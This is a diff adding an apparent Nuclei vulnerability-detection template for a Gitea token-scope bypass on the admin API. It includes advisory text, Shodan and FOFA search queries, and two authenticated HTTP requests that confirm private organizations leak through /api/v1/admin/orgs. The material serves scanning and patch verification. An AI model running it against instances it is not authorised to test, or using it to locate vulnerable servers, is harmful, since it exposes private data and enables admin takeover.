@@ -1,0 +1,73 @@
+id: vt-2026-117635
+
+info:
+  name: Gitea <= 28.2.0 - Public-only Token Scope Bypass on Admin API
+  author: omarkurt
+  severity: high
+  description: |
+    Gitea through 28.2.0 does not enforce the public-only access-token restriction on the
+    /api/v1/admin route group. A site-admin-issued token carrying the public-only flag and
+    the write:admin scope is correctly refused on GET /api/v1/orgs/{private-org}
+    ("token scope is limited to public orgs") yet is accepted on GET /api/v1/admin/orgs,
+    which returns private organizations. The same token can enumerate all users, create
+    private orgs, mint runner registration tokens, and create or promote a site admin.
+  impact: |
+    A holder of a public-only token - meant to be limited to public resources - gains full
+    administrative reach, including durable persistence via a newly created admin account.
+  remediation: |
+    Upgrade to Gitea 28.3.0 or later. Audit site-admin accounts and runner registration
+    tokens, and rotate public-only tokens issued from admin accounts.
+  reference:
+    - https://vulnerabletarget.com/VT-2026-117635
+    - https://github.com/go-gitea/gitea/security/advisories/GHSA-37xv-m4w7-j2fh
+    - https://www.cve.org/CVERecord?id=CVE-2026-117635
+    - https://github.com/go-gitea/gitea/pull/39690
+    - https://escape.tech/blog/escape-research-found-a-scope-bypass-that-made-gitea-s-restricted-tokens-full-admins-it-s-now-cve-2026-117635/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.1
+    cve-id: CVE-2026-117635
+    cwe-id: CWE-284
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: gitea
+    product: gitea
+    shodan-query: http.title:"Gitea"
+    fofa-query: app="Gitea"
+  tags: cve,cve2026,gitea,access-control,privilege-escalation,token-scope,authenticated,cwe-284
+
+# AUTHENTICATED TEMPLATE - requires two external variables; it will NOT match on an
+# unauthenticated scan by design, because the vulnerability requires a site-admin-issued
+# public-only token:
+#   {{token}} = a public-only token with the write:admin scope, issued from a site-admin account
+#   {{org}}   = the slug of a PRIVATE organization on the target
+# Run:
+#   nuclei -t vt-2026-117635.nuclei.yaml -u http://target:3000 -var token=<TOKEN> -var org=<private-org>
+# Pre-fix (<=28.2.0): the control route refuses the token (403) while the admin route leaks
+# the private org (200) -> match. Patched (28.3.0+): the admin route also refuses -> no match.
+# Without the vars (or with a non-public-only / non-admin token): no match.
+
+http:
+  - raw:
+      - |
+        GET /api/v1/orgs/{{org}} HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: token {{token}}
+        Accept: application/json
+      - |
+        GET /api/v1/admin/orgs?limit=50 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: token {{token}}
+        Accept: application/json
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 403'
+          - 'contains(body_1, "token scope is limited")'
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "\"visibility\":\"private\"")'
+        condition: and
